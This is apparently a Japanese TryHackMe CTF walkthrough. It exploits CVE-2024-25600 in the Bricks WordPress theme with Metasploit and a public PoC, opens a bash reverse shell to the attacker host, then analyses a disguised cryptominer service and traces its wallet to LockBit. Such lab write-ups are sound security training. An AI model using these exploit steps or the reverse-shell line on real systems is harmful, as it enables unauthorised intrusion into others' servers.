---
author: "ijikeman"
showToc: true
TocOpen: true
title: "TryHackMe: TryHack3M Bricks Heist Walkthrough"
date: 2026-01-15T00:00:00+09:00
aliases: ["/TryHackMe/bricks-heist"]
tags: ["TryHackMe", "CTF", "walkthrough", "WordPress", "CVE-2024-25600", "Metasploit", "ThreatIntel", "マルウェア調査"]
categories: ["TryHackMe"]
draft: true
cover:
    image: "/images/eyecatch/TryHackMe/bricks-heist/index.png"
---

# このページでわかること

* TryHackMe ルーム「TryHack3M: Bricks Heist」のWalkthrough
* WordPress + Bricks Builder の既知 RCE 脆弱性（CVE-2024-25600）を利用した初期侵入
* systemctl によるマイニングマルウェアの偽装プロセス調査
* 多段エンコード（Hex → Base64 → Base64）によるウォレットアドレスの復元
* ブロックチェーン調査と OFAC サンクションリストを使った脅威グループの特定

# ルーム情報

| 項目 | 内容 |
|------|------|
| ルーム名 | TryHack3M: Bricks Heist |
| 難易度 | Easy |
| カテゴリ | Web, WordPress, Threat Intelligence |
| URL | https://tryhackme.com/room/tryhack3mbricksheist |
| OS | Linux |

# 執筆時の環境

* OS: Ubuntu (TryHackMe AttackBox)
* ツール: nmap, gobuster, wpscan, metasploit, netcat, CyberChef

# 参考サイト

* [TryHackMe 公式](https://tryhackme.com/room/tryhack3mbricksheist)
* [CVE-2024-25600 解説 - Machina Record](https://codebook.machinarecord.com/threatreport/32027/)
* [CVE-2024-25600 PoC - K3ysTr0K3R](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
* [CyberChef](https://gchq.github.io/CyberChef/)
* [Blockchain Explorer](https://www.blockchain.com/explorer/)
* [OFAC LockBit 制裁リスト](https://ofac.treasury.gov/recent-actions/20240220)

---

# 1. ポートスキャン

## 1-1. TCP ポートスキャン

```bash
nmap -sT -n $IP
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
```

| ポート | サービス | 備考 |
|--------|---------|------|
| 22/tcp | SSH | |
| 80/tcp | HTTP | |
| 443/tcp | HTTPS | WordPress が動作 |
| 3306/tcp | MySQL | |

HTTPS (443) で WordPress が動作しており、MySQL (3306) も外部からアクセス可能な状態だった。

---

# 2. Web 列挙

## 2-1. /etc/hosts への登録

```bash
echo "$IP bricks.thm" >> /etc/hosts
```

## 2-2. Gobuster によるディレクトリ列挙

HTTPS サイトに対して Gobuster を実行する際は `--no-tls-validation` が必須となる。このオプションを付けないと TLS 証明書の検証エラーでスキャンが失敗する。

```bash
gobuster dir -u https://bricks.thm \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  --no-tls-validation
```

| パス | ステータス | 備考 |
|-----|---------|------|
| /wp-content | 301 | WordPress コンテンツディレクトリ |
| /wp-admin | 301 | WordPress 管理画面 |
| /wp-includes | 301 | WordPress コアファイル |
| /phpmyadmin | 301 | phpMyAdmin にアクセス可能 |
| /login | 302 | wp-login.php へリダイレクト |

> ポイント: HTTPS に対する Gobuster には `--no-tls-validation` が必要。付け忘れると証明書エラーでスキャンが動かない。

## 2-3. wpscan による WordPress 調査

```bash
wpscan --url https://bricks.thm/ --disable-tls-checks
```

| 項目 | 内容 |
|-----|------|
| WordPress バージョン | 6.5 (Insecure) |
| テーマ | Bricks 1.9.5 ← 脆弱なバージョン |
| XML-RPC | 有効 |
| WP-Cron | 有効 |

Bricks テーマのバージョンが `1.9.5` であることが判明した。1.9.6 未満には認証不要の RCE 脆弱性（CVE-2024-25600）が存在する。

---

# 3. 攻撃 (Exploitation)

## 3-1. CVE-2024-25600 とは

Bricks Builder 1.9.6 未満に存在する、認証不要のリモートコード実行（RCE）脆弱性。WordPress サイトが Bricks テーマを利用している場合、攻撃者は管理者権限なしにサーバ上で任意のコードを実行できる。

## 3-2. Metasploit による RCE

```bash
msfconsole
```

```
msf6> search CVE-2024-25600
# → exploit/multi/http/wp_bricks_builder_rce

msf6> use exploit/multi/http/wp_bricks_builder_rce
msf6> set rhosts https://bricks.thm
msf6> set rport 443
msf6> set lhost <攻撃元IP>
msf6> run
```

```
[*] Meterpreter session 1 opened (攻撃元IP:4444 -> ターゲットIP:xxxxx)
```

* `apache` ユーザで Meterpreter セッションが開いた

## 3-3. 隠しファイルの発見（フラグ 1）

```bash
meterpreter> ls
```

```
650c844110baced87e1606453b93f22a.txt
```

```bash
meterpreter> cat 650c844110baced87e1606453b93f22a.txt
# → THM{...}
```

* WordPress のルートディレクトリに隠しテキストファイルが存在した

## 3-4. PoC スクリプトを使った代替手法

Metasploit を使わず、公開 PoC スクリプトでも同様に RCE を実行できる。

```bash
python3 -m venv ~/myvenv
source ~/myvenv/bin/activate
pip3 install alive_progress requests bs4 rich prompt_toolkit

# CVE-2024-25600 PoC
# https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
python CVE-2024-25600.py -u https://bricks.thm
```

---

# 4. プロセス調査・マルウェア分析

## 4-1. 安定したシェルへの切り替え

Meterpreter セッションからリバースシェルに切り替えて調査を進める。

```bash
# 攻撃元で待ち受け
nc -lnvp 8888
```

```bash
# PoC シェルから実行
Shell> bash -c "bash -i >& /dev/tcp/<攻撃元IP>/8888 0>&1"
# → apache@...:/data/www/default$
```

## 4-2. 疑わしいサービスの発見

全実行中サービスを確認する。

```bash
systemctl | grep running
```

```
ubuntu.service  loaded active running  TRYHACK3M
```

* `ubuntu.service` という名前で `TRYHACK3M` の説明を持つ不審なサービスを発見

## 4-3. サービス設定ファイルの確認

```bash
cat /etc/systemd/system/ubuntu.service
```

```ini
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure
```

* `ExecStart` に `/lib/NetworkManager/nm-inet-dialog` が指定されている
* NetworkManager の正規ファイルを装った偽装スクリプトで、マイニングプロセスとして動作している

> ポイント: `nm-inet-dialog` は正規の NetworkManager のファイル名に似せており、一見しただけでは正規プロセスと区別がつきにくい。`/lib/NetworkManager/` 配下の不審なファイルを見落とさないことが重要。

## 4-4. マイナーのハッシュ確認

```bash
sha256sum /lib/NetworkManager/nm-inet-dialog
```

```
2d96bf6e392bbd29c2d13f6393410e4599a40e1f2fe9dc8a7b744d11f05eb756  /lib/NetworkManager/nm-inet-dialog
```

---

# 5. ウォレットアドレスの復元

## 5-1. ログファイルの確認

マイニングプロセスのログファイルを確認する。

```bash
head /lib/NetworkManager/inet.conf
```

```
ID: 5757314e65474e5962484a4f656d...（長い16進数文字列）
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
```

* ログファイル名: `inet.conf`
* `ID` フィールドに長い16進数文字列が記録されている

## 5-2. 多段デコードによるウォレットアドレスの復元

CyberChef (https://gchq.github.io/CyberChef/) を使い、以下の順序でデコードする。

```
From Hex → From Base64 → From Base64
```

* 一段だけのデコードでは意味のある文字列にならないため、必ず 3 段階すべてを実行する

デコード結果として Bitcoin アドレスが得られる:

```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

---

# 6. 脅威インテリジェンス調査

## 6-1. ブロックチェーン調査

復元した BTC アドレスを [blockchain.com](https://www.blockchain.com/explorer/) で調査する。

取引履歴を確認すると、関連する別のウォレット `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r` との取引が見つかる。

## 6-2. OFAC サンクションリストとの照合

米国財務省（OFAC）の制裁リストを確認する。

* URL: https://ofac.treasury.gov/recent-actions/20240220

この関連ウォレットアドレスが **LockBit** ランサムウェアグループのウォレットアドレスとして制裁リストに掲載されていることが確認できた。

---

# 7. フラグ取得

| 質問 | 取得方法 |
|-----|---------|
| 隠し .txt ファイルの内容は？ | Meterpreter で WordPress ルートの隠しファイルを cat |
| 疑わしいプロセスの名前は？ | `systemctl \| grep running` で特定 |
| 疑わしいプロセスのサービス名は？ | `/etc/systemd/system/ubuntu.service` を確認 |
| マイナーのログファイル名は？ | サービス設定の ExecStart パスから特定 |
| マイナーのウォレットアドレスは？ | `inet.conf` の ID を多段デコードして取得 |
| 関連する脅威グループは？ | OFAC サンクションリストとブロックチェーン調査で特定 |

---

# 8. まとめ

このルームでは、WordPress + Bricks Builder という実在する構成に対して、2024 年に公開された CVE-2024-25600 を利用して初期侵入を行い、さらにホスト上で動作するマイニングマルウェアを調査・分析するという二段構成の攻略フローが求められた。

## 習得スキル

* **wpscan の活用**: WordPress の脆弱なバージョンおよびテーマを素早く検出する手法
* **CVE-2024-25600 の悪用**: Bricks Builder 1.9.6 未満に存在する認証不要 RCE の仕組みと実践
* **偽装プロセスの発見**: `systemctl | grep running` で全サービスを確認し、不審なエントリを洗い出す手法
* **マルウェアの偽装手口の理解**: 正規ディレクトリに正規ファイル名に近い名前で配置する手口への対処
* **多段エンコードのデコード**: Hex → Base64 → Base64 の多段エンコードは CyberChef の Recipe 機能が有効
* **Threat Intel（ブロックチェーン調査）**: BTC アドレスとブロックチェーン調査・OFAC サンクションリストを組み合わせた脅威グループの特定

## ハマったポイント

* Gobuster に `--no-tls-validation` を付けないと HTTPS サイトをスキャンできない
* `nm-inet-dialog` は正規の NetworkManager ファイル名に似せているため、パッと見では気づきにくい
* `inet.conf` の ID フィールドは多段エンコードされており、一段目のデコードだけでは意味のある文字列が得られない

> 免責事項: 本記事は教育・学習目的で作成しています。実際のシステムへの無断アクセスは違法です。必ず許可を得た環境（TryHackMe 等のプラットフォーム）でのみ実施してください。
